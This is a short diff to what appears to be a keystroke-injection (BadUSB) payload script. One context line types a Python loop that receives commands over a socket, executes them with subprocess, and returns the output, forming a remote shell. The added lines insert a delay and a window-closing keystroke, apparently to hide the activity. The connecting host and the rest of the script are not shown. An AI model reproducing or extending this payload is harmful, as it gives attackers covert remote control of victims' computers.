@@ -11,3 +11,5 @@ ENTER
 STRING while 1:c.send(subprocess.getoutput(c.recv(9999).decode()).encode())"{close_terminal}
 DELAY 50
 ENTER
+DELAY 200
+COMMAND w
